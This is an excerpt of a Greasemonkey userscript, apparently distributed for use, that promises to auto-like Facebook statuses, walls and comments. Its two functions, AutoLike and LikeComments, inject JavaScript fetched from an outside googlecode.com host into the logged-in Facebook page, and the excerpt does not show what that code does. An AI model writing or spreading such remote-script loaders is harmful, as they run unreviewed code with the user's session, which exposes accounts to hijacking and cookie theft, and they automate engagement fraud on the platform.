// ==UserScript==
// @name           Auto Like Facebook by P Woe
// @namespace      http://www.facebook.com/r4d354p
// @description	   Auto Like Facebook by pwoe. Auto Like status, wall and facebook comments system
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="http://my-project-likefb.googlecode.com/files/slike.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="http://my-project-likefb.googlecode.com/files/nlac.js",b.body.appendChild(a);void(0);};}
body = document.body;
